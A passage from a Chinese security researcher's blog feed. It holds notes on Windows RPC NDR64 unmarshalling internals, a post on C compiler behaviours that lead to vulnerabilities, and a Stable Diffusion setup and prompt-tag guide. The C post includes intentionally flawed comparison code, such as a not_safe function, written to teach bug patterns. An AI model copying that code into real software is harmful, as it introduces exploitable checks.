class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">FC64_ZERO = 0 0x0</span><br><span class="line">FC64_UINT8 = 1 0x1</span><br><span class="line">FC64_INT8 = 2 0x2</span><br><span class="line">FC64_UINT16 = 3 0x3</span><br><span class="line">FC64_INT16 = 4 0x4</span><br><span class="line">FC64_INT32 = 5 0x5</span><br><span class="line">FC64_UINT32 = 6 0x6</span><br><span class="line">FC64_INT64 = 7 0x7</span><br><span class="line">FC64_UINT64 = 8 0x8</span><br><span class="line">FC64_INT128 = 9 0x9</span><br><span class="line">FC64_UINT128 = 10 0xa</span><br><span class="line">FC64_FLOAT32 = 11 0xb</span><br><span class="line">FC64_FLOAT64 = 12 0xc</span><br><span class="line">FC64_FLOAT80 = 13 0xd</span><br><span class="line">FC64_FLOAT128 = 14 0xe</span><br><span class="line">FC64_CHAR = 16 0x10</span><br><span class="line">FC64_WCHAR = 17 0x11</span><br><span class="line">FC64_IGNORE = 18 0x12</span><br><span class="line">FC64_ERROR_STATUS_T = 19 0x13</span><br><span class="line">FC64_POINTER = 20 0x14</span><br><span class="line">FC64_RP = 32 0x20</span><br><span class="line">FC64_UP = 33 0x21 //表示这个字段是个指针</span><br><span class="line">FC64_OP = 34 0x22</span><br><span class="line">FC64_FP = 35 0x23</span><br><span class="line">FC64_IP = 36 0x24</span><br><span class="line">FC64_STRUCT = 48 0x30</span><br><span class="line">FC64_PSTRUCT = 49 0x31</span><br><span class="line">FC64_CONF_STRUCT = 50 0x32</span><br><span class="line">FC64_CONF_PSTRUCT = 51 0x33</span><br><span class="line">FC64_BOGUS_STRUCT = 52 0x34</span><br><span class="line">FC64_FORCED_BOGUS_STRUCT = 53 0x35</span><br><span class="line">FC64_CONF_BOGUS_STRUCT = 54 0x36</span><br><span class="line">FC64_FORCED_CONF_BOGUS_STRUCT = 55 0x37</span><br><span class="line">FC64_SYSTEM_HANDLE = 60 0x3c</span><br><span class="line">FC64_FIX_ARRAY = 64 0x40</span><br><span class="line">FC64_CONF_ARRAY = 65 0x41</span><br><span class="line">FC64_VAR_ARRAY = 66 0x42</span><br><span class="line">FC64_CONFVAR_ARRAY = 67 0x43</span><br><span class="line">FC64_FIX_FORCED_BOGUS_ARRAY = 68 0x44</span><br><span class="line">FC64_FIX_BOGUS_ARRAY = 69 0x45</span><br><span class="line">FC64_FORCED_BOGUS_ARRAY = 70 0x46</span><br><span class="line">FC64_BOGUS_ARRAY = 71 0x47</span><br><span class="line">FC64_ENCAPSULATED_UNION = 80 0x50</span><br><span class="line">FC64_NON_ENCAPSULATED_UNION = 81 0x51</span><br><span class="line">FC64_CHAR_STRING = 96 0x60</span><br><span class="line">FC64_WCHAR_STRING = 97 0x61</span><br><span class="line">FC64_STRUCT_STRING = 98 0x62</span><br><span class="line">FC64_CONF_CHAR_STRING = 99 0x63</span><br><span class="line">FC64_CONF_WCHAR_STRING = 100 0x64</span><br><span class="line">FC64_CONF_STRUCT_STRING = 101 0x65</span><br><span class="line">FC64_BIND_CONTEXT = 112 0x70</span><br><span class="line">FC64_BIND_GENERIC = 113 0x71</span><br><span class="line">FC64_BIND_PRIMITIVE = 114 0x72</span><br><span class="line">FC64_AUTO_HANDLE = 115 0x73</span><br><span class="line">FC64_CALLBACK_HANDLE = 116 0x74</span><br><span class="line">FC64_SUPPLEMENT = 117 0x75</span><br><span class="line">FC64_NO_REPEAT = 128 0x80</span><br><span class="line">FC64_FIXED_REPEAT = 129 0x81</span><br><span class="line">FC64_VARIABLE_REPEAT = 130 0x82</span><br><span class="line">FC64_FIXED_OFFSET = 131 0x83</span><br><span class="line">FC64_VARIABLE_OFFSET = 132 0x84</span><br><span class="line">FC64_STRUCTPADN = 144 0x90</span><br><span class="line">FC64_EMBEDDED_COMPLEX = 145 0x91</span><br><span class="line">FC64_BUFFER_ALIGN = 146 0x92</span><br><span class="line">FC64_END = 147 0x93</span><br><span class="line">FC64_TRANSMIT_AS = 160 0xa0</span><br><span class="line">FC64_REPRESENT_AS = 161 0xa1</span><br><span class="line">FC64_USER_MARSHAL = 162 0xa2</span><br><span class="line">FC64_PIPE = 163 0xa3</span><br><span class="line">FC64_RANGE = 164 0xa4</span><br><span class="line">FC64_PAD = 165 0xa5</span><br></pre></td></tr></table></figure><p>通过以下方式获取:<img src="/images/rpc_readme/1722226870055.png" alt="1722226870055"></p><p>参考来源: <a href="https://powerofcommunity.net/poc2023/JamesForshaw.pdf">Building More Windows RPC  Tooling for Security Research - James Forshaw </a></p><h2 id="RPC-反序列化流程-不完整"><a href="#RPC-反序列化流程-不完整" class="headerlink" title="RPC 反序列化流程(不完整)"></a>RPC 反序列化流程(不完整)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Ndr64StubWorker</span><br><span class="line">Ndr64pServerUnMarshal</span><br><span class="line">check func arg tag; IsBasetype.....</span><br><span class="line">Ndr64pPointerUnmarshall</span><br><span class="line">or</span><br><span class="line">Ndr64ConformantStringUnmarshall</span><br><span class="line">or</span><br><span class="line">Ndr64ComplexStructUnmarshall // 针对结构体指针类型</span><br><span class="line">Ndr64ComplexStructMemorySize // 检查结构体描述符, 计算结构体长度</span><br><span class="line">解码数据....</span><br><span class="line">Ndr64SimpleTypeUnmarshall</span><br><span class="line">Ndr64EmbeddedPointerUnmarshall</span><br><span class="line">Ndr64ConformantArrayUnmarshall</span><br><span class="line">Ndr64pEarlyCheckCorrelation</span><br><span class="line">EvaluateExpr</span><br><span class="line">Ndr64pGetAllocateAllNodesContext</span><br><span class="line">Ndr64ConformantArrayMemorySize</span><br><span class="line">a1-&gt;pfnAllocate()// 申请数组的堆</span><br><span class="line">.....</span><br><span class="line">or</span><br><span class="line">Ndr64UnmarshallHandle // 针对 context_handle 类型</span><br><span class="line">.....</span><br><span class="line">Invoke</span><br><span class="line">target rpc func</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html">https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html</a> </p><p><a href="https://www.codeproject.com/Articles/4837/Introduction-to-RPC-Part-1#Implicitandexplicithandles17">https://www.codeproject.com/Articles/4837/Introduction-to-RPC-Part-1#Implicitandexplicithandles17</a></p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢 <a href="https://twitter.com/KeyZ3r0">k0shl</a>, <a href="https://twitter.com/XiaoWei___">@XiaoWei___</a> 两位大佬帮我理解这个rpc.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;windows的rpc是一个很重要的接口, 以前我对它一直不算了解, 今天以一个安全研究的角度去介绍一下它. &lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>和编译器编译结果有关的漏洞问题</title>
    <link href="http://474172261.github.io/2023/03/24/compiler_error/"/>
    <id>http://474172261.github.io/2023/03/24/compiler_error/</id>
    <published>2023-03-24T06:49:54.908Z</published>
    <updated>2023-08-18T03:59:42.017Z</updated>
    
    <content type="html"><![CDATA[<p>c语言作为最基础的语言，经历了这么多年的迭代，它的标准里依然存在很多未定义的东西，而不同的编译器就会出现不一样的结果，这边blog主要是总结一些可能出现的和编译器的编译结果有关的漏洞</p><span id="more"></span> <h2 id="有符号和bit字段的比较"><a href="#有符号和bit字段的比较" class="headerlink" title="有符号和bit字段的比较"></a>有符号和bit字段的比较</h2><p>c语言有种结构体， 用的是bit位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> f1 : <span class="number">8</span>;</span><br><span class="line"><span class="type">unsigned</span> f2 : <span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> f3 : <span class="number">6</span>;</span><br><span class="line">&#125; t1;</span><br></pre></td></tr></table></figure><p>这个结构体最终的sizeof(t1)为2, 因为它只用了2个字节存储数据.</p><p>然而, 当一个int类型的结构体和t1的字段比较时, 结果就未知了.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> f1 : <span class="number">8</span>;</span><br><span class="line"><span class="type">unsigned</span> f2 : <span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> f3 : <span class="number">6</span>;</span><br><span class="line">&#125; t1;</span><br><span class="line"><span class="type">int</span> t2 = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">t1.f1 = <span class="number">0xaa</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, t2 &gt; t1.f1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码, gcc的结果就是0, 而使用visual studio编译的就是1. </p><p>这种无符号和有符号的比较一般是要将有符号的数变成无符号再比较的, 在汇编层就是<code>ja, jb</code>这种跳转, 然而gcc的就是先把f1扩展成无符号的int, 然后有符号比较. 导致输出就是0. 这样就可能出现安全漏洞. </p><p>而且 <code>gcc t.c -Werror -Wall -Wextra -Wconversion</code>这样编译的情况下, 依然不会有任何警告!!</p><h2 id="无符号和0的比较"><a href="#无符号和0的比较" class="headerlink" title="无符号和0的比较"></a>无符号和0的比较</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line">&#125; *a;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">not_safe</span><span class="params">(<span class="keyword">struct</span> s *ptr)</span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(ptr-&gt;len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> s) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc默认是不会警告的, 只有启用<code>-Wextra</code>才会警告这种行为, 所以遇到这种比较可以关注一下</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;c语言作为最基础的语言，经历了这么多年的迭代，它的标准里依然存在很多未定义的东西，而不同的编译器就会出现不一样的结果，这边blog主要是总结一些可能出现的和编译器的编译结果有关的漏洞&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Stable Diffusion安装使用指南</title>
    <link href="http://474172261.github.io/2023/02/28/stable-diffusion-introduce/"/>
    <id>http://474172261.github.io/2023/02/28/stable-diffusion-introduce/</id>
    <published>2023-02-28T01:54:06.052Z</published>
    <updated>2023-10-16T02:13:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>时下文生图已经非常火热, 自己搭一个服务, 跑起来玩也是不错的选择</p><span id="more"></span><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>Windows环境搭建</strong></p><ol><li><p>获取<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui</a>, 解压缩.</p></li><li><p>安装<a href="https://www.python.org/downloads/release/python-3109/">python 3.10.9</a>, 注意开头要勾选把python添加到PATH或者手动添加. </p></li><li><p>设置国内pip源. 在<code>C:\users\你的用户名\</code>下创建<code>pip</code>文件夹, 并新建<code>pip.ini</code>文件, 添加以下内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><p>当然也可以选其他源:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">阿里云:http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">中国科技大学:https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line">豆瓣(douban):http://pypi.douban.com/simple/</span><br><span class="line">清华大学:https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">中国科学技术大学:http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure></li><li><p>安装<a href="https://git-scm.com/downloads">git</a>, 安装完成后, 最好是有本地翻墙, 设置git代理, 不然下载可能出现问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global http.proxy http://127.0.0.1:1080</span><br></pre></td></tr></table></figure></li><li><p>进入<code>stable-diffusion-webui</code>目录, 打开<code>launch.py</code></p><p>在下面位置添加一行输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">command, desc=<span class="literal">None</span>, errdesc=<span class="literal">None</span>, custom_env=<span class="literal">None</span>, live=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;run:&quot;</span>, command) <span class="comment"># 添加此行</span></span><br><span class="line">    <span class="keyword">if</span> desc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(desc)</span><br></pre></td></tr></table></figure></li><li><p>运行<code>webui.bat</code>, 它会自动下载需要的组件. </p><blockquote><p>如果遇到它输出卡了很久或者失败, 找到我们设置的<code>run:</code>输出, 手动执行一下看看问题在哪. </p><p>默认它会先git下载需要的库到<code>repositories</code>目录里, 然后才下载python的库, 为了提高操作速度, 可以在它下载git的时候另起一个终端执行<code>python -m pip install -r requirements_versions.txt --prefer-binary</code>下载所需的库.</p><p>如果显卡的内存比较低, 打开<code>webui-user.bat</code>, 在<code> COMMANDLINE_ARGS=</code> 后添加 <code>--lowvram</code>(显卡是2GB显存), 或者<code>--medvram</code>(4GB - 6GB显存), 然后运行<code>webui-user.bat</code>而非<code>webui.bat</code>. <a href="https://rentry.org/voldy">参考</a></p></blockquote><p>出现以下信息代表正常执行, 可以在浏览器访问它了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Model loaded in 13.9s (load weights from disk: 0.1s, create model: 0.6s, apply weights to model: 8.6s, apply half(): 1.2s, move model to device: 1.3s, load textual inversion embeddings: 1.9s).</span><br><span class="line">run: git rev-parse HEAD</span><br><span class="line">Running on local URL:  http://127.0.0.1:7860</span><br><span class="line"></span><br><span class="line">To create a public link, set `share=True` in `launch()`</span><br></pre></td></tr></table></figure></li><li><p>访问<a href="http://127.0.0.1:7860/">http://127.0.0.1:7860</a>:</p><p><img src="/images/stable-diffusion-introduce/1678413027084.png" alt="1678413027084"></p></li></ol><h1 id="tag指南"><a href="#tag指南" class="headerlink" title="tag指南"></a>tag指南</h1><h2 id="tag规则"><a href="#tag规则" class="headerlink" title="tag规则"></a>tag规则</h2><p><code>(tag)</code>表示强调tag, <code>((tag))</code>可以像这样嵌套多个括号, 强调更高, 但其实还不如写数值, 比如<code>(tag:1.2)</code>, 就是强调1.2倍, 当然也可以是小于1来减弱.</p><p>tag1|tag2 表示混合1:1使用, <code>1girl,red|blue hair, long hair</code>就是说红蓝长发的女孩</p><p><code>[tag]</code>就是减弱tag</p><p><code>[tag1:tag2:n]</code>, 如果n为正整数, 就是在n步前用tag1, n步后用tag2, 如果&lt;1的小数, 就是百分比</p><p>[tag1|tag2] 表示这是混合物. <code>[cow|horse|cat|dog] in a field</code>就是先朝着像牛努力，再朝着像马努力，再向着猫努力，再向着狗努力，再向着马努力 </p><p>tag越靠前, 权重越大. tag越多, 每个的权重就越小. 如果拼写错误, 将会理解成字母.</p><p><code>&lt;lora:theovercomer8sContrastFix_sd15:0.6&gt;</code> 这种就是选择了模型后, 自动填入的, <code>:</code>表示强调程度,</p><p><a href="/otherfile/SD-WebUI%E6%8C%87%E5%8D%97-%E5%8F%82%E6%95%B0%E7%AF%87.pdf">参考文件</a>, 来自B站up主<code>PiPI哈皮</code>.</p><h2 id="tag进阶"><a href="#tag进阶" class="headerlink" title="tag进阶"></a>tag进阶</h2><p>参考: <a href="https://zhuanlan.zhihu.com/p/577238010">Stable Diffusion使用入门与提示词技巧</a> </p><p>推荐的tag顺序是: 描述画质的词, 画面主要内容的词</p><p><strong>提高画质</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">best quality, ultra-detailed, masterpiece, finely detail, highres, 4k, 8k wallpaper, extremely clear, ultra-detailed unity 8k wallpaper, dreamlike</span><br></pre></td></tr></table></figure><p><strong>画质负面词</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(worst quality:2), (low quality:2), (normal quality:2), lowres</span><br><span class="line">以下的是text inversion, 需要在civitai下载</span><br><span class="line">EasyNegative,ng_deepnegative_v1_75t</span><br></pre></td></tr></table></figure><p><strong>保真</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realistic, photo-realistic,vivid</span><br></pre></td></tr></table></figure><p><strong>提高元素质量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beautiful detailed eyes, detailed facial features, detailed clothes features</span><br><span class="line">highly detailed skin</span><br><span class="line">extremely delicate and beautiful girls</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后面的名词也可以换成其他的</p><p><strong>人物负面词</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mutated hands and fingers,deformed, bad anatomy, disfigured, poorly drawn face, mutation, extra limb, ugly, poorly drawn hands, missing limb, floating limbs, disconnected limbs, malformed hands, out of focus, long neck, long body, skin blemishes,acnes(粉刺), skin spots(皮肤斑点), age spot(老年斑)</span><br></pre></td></tr></table></figure><p><strong>人物描述词</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smile, puffy eyes(眼袋 卧蚕?),skin tight(紧致),shiny(光泽) skin,slender(纤细),slim</span><br><span class="line">bangs(刘海),</span><br></pre></td></tr></table></figure><p><strong>手的负面词</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((poorly drawn hands)),more than 1 left hand, more than 1 right hand, short arm, (((missing arms))), bad hands,missing fingers,(extradigit),(fewer digits),mutated hands,(fused fingers),(too many fingers),sharp fingers,wrong figernails,long hand,double middle finger,index fingers together,missing indexfinger,interlocked fingers,pieck fingers,sharp fingernails,(steepled fingers),x fingers,((curled fingers)),(no finger gaps),interlocked fingers,fingers different thickness,cross fingers,poor outline,big fingers,finger growth,outline on body,outline on hair,out line on background,more than one hands,fuse arm,fuse elbow,more than two arm,more than two elbow</span><br></pre></td></tr></table></figure><p><strong>视角和视线</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dynamic angle</span><br><span class="line">from above 俯视</span><br><span class="line">from below 仰视</span><br><span class="line">wide shot 广角</span><br><span class="line">Aerial View 鸟瞰</span><br><span class="line">looking at viewer</span><br><span class="line">looking at another</span><br><span class="line">looking away</span><br><span class="line">looking back</span><br><span class="line">looking up</span><br></pre></td></tr></table></figure><p><strong>身体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">full body shot 全身</span><br><span class="line">half body shot,cowboy shot 半身</span><br><span class="line">close-up shot 近身</span><br></pre></td></tr></table></figure><p><strong>光线</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dynamic lighting 动态光</span><br><span class="line">cinematic lighting 电影光</span><br><span class="line">professional lighting</span><br><span class="line">soft lighting, radiosity</span><br></pre></td></tr></table></figure><p><strong>画风</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sketch 素描</span><br><span class="line">one-hour drawing challenge 手绘风</span><br></pre></td></tr></table></figure><p><strong>身体状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blush（脸红）</span><br><span class="line">wet sweat（大汗）</span><br><span class="line">flying sweatdrops (飞汗 ）</span><br></pre></td></tr></table></figure><p><strong>姿势</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hands on 例hands on own face, hands on feet, hands on breast </span><br><span class="line">kneeling 跪着</span><br><span class="line">hand between legs</span><br><span class="line">hair flip 撩发</span><br><span class="line">skirt flip 撩衣</span><br></pre></td></tr></table></figure><h2 id="推荐的获取tag的网站"><a href="#推荐的获取tag的网站" class="headerlink" title="推荐的获取tag的网站"></a>推荐的获取tag的网站</h2><p><a href="Lexica.art">Lexica</a> 有图片和prompt</p><p><a href="https://www.pixiv.net/">pixiv</a> ai图片分享</p><p><a href="https://civitai.com/">civitai</a>里面的每一个模型的图片都有人分享, 通过PNG Info获取prompt</p><p><a href="https://aitag.top/">aitag</a> 一个tag网站</p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="获取AI图的信息"><a href="#获取AI图的信息" class="headerlink" title="获取AI图的信息"></a>获取AI图的信息</h2><p>如果看上了一个ai图片, 找到原图, 把图放到webui的PNG info里, 可以读取生成时的参数, 不过小心网络图片压缩导致的信息丢失.</p><p>另外, 由于模型的本地文件名决定了某些tag的名称, 所以如果你下载模型的时候没有使用默认名称, 就需要知道它具体用了什么模型, 改成正确的名字.</p><p>此外, <code>text inversion</code>在被使用的时候, 是没办法和普通tag做区分的, 如果发现奇怪的名词tag, 那大概率是<code>text inversion</code>. 可以在civitai里搜索它.</p><h1 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h1><p><a href="https://zhuanlan.zhihu.com/p/584736850">StableDiffusion&#x2F;NAI DreamBooth自训练全教程</a></p><h1 id="模型推荐"><a href="#模型推荐" class="headerlink" title="模型推荐"></a>模型推荐</h1><p><a href="https://civitai.com/models/13941/epinoiseoffset">https://civitai.com/models/13941/epinoiseoffset</a> 提高对比度的Noise Offset的Lora模型</p><h1 id="教程推荐"><a href="#教程推荐" class="headerlink" title="教程推荐"></a>教程推荐</h1><p><a href="https://zhuanlan.zhihu.com/p/607892849">AI绘画教程：从入门到放弃(xiaobai)</a></p><h1 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h1><p><a href="https://github.com/DominikDoom/a1111-sd-webui-tagcomplete.git">Booru tag autocompletion</a>, 自动补全tag</p><h1 id="在线体验服务"><a href="#在线体验服务" class="headerlink" title="在线体验服务"></a>在线体验服务</h1><p>huggingface可以提供名为Space的虚拟机服务,  上面有很多免费的各种服务, 可以通过这些免费的服务来跑 AI出图 的demo. 缺点就是速度慢, 而且没办法灵活运用插件, 只能跑着玩.</p><p>比如如下几个服务:</p><h2 id="controlnet"><a href="#controlnet" class="headerlink" title="controlnet"></a>controlnet</h2><p><a href="https://huggingface.co/spaces/hysts/ControlNet">https://huggingface.co/spaces/hysts/ControlNet</a></p><h2 id="stable-diffusion-webui"><a href="#stable-diffusion-webui" class="headerlink" title="stable-diffusion-webui"></a>stable-diffusion-webui</h2><p><a href="https://huggingface.co/spaces/jackli888/stable-diffusion-webui">https://huggingface.co/spaces/jackli888/stable-diffusion-webui</a></p><h1 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h1><ol><li><p><strong>No module ‘xformers’. Proceeding without it.</strong></p><p>对于低端显卡, 倒是没什么影响, 但是高端显卡, 可能需要解决一下</p></li><li><p><strong>ModuleNotFoundError: No module named ‘basicsr.version’</strong></p><p>先重新运行<code>python -m pip install -r requirements_versions.txt --prefer-binary</code>, 再打开<code>stable-diffusion-webui\venv\pyvenv.cfg </code>, 修改<code> include-system-site-packages = true </code>, 再重新运行<code>webui.bat</code>即可. <a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/1598">参考</a></p></li><li><p><strong>Expected all tensors to be on the same device, but found at least two devices, cpu and cuda:0! (when checking argument for argument index in method wrapper__index_select)</strong></p><p>去掉webui-user.bat的 <code>--medvram</code></p></li><li><p><strong>RuntimeError: CUDA out of memory. Tried to allocate 30.00 MiB (GPU 0; 4.00 GiB total capacity; 1.7 GiB already allocated; 0 bytes free; 2.30 GiB reserved in total by PyTorch) If reserved memory is &gt;&gt; allocated memory try setting max_split_size_mb to avoid fragmentation.</strong></p><p>显卡内存不足, 在<code>webui-user.bat</code>的<code> COMMANDLINE_ARGS=</code> 添加<code>--lowvram</code>, 使用<code>webui-user.bat</code>启动</p></li></ol><p><a href="https://www.bilibili.com/read/cv19183915/">其他错误参考</a></p><h1 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h1><p><a href="https://openai.wiki/ai-painting-model-guide.html">来源</a></p><h2 id="模型仓库"><a href="#模型仓库" class="headerlink" title="模型仓库"></a>模型仓库</h2><p>常见的模型下载仓库为以下几种，点击可直接前往仓库地址：</p><ul><li><a 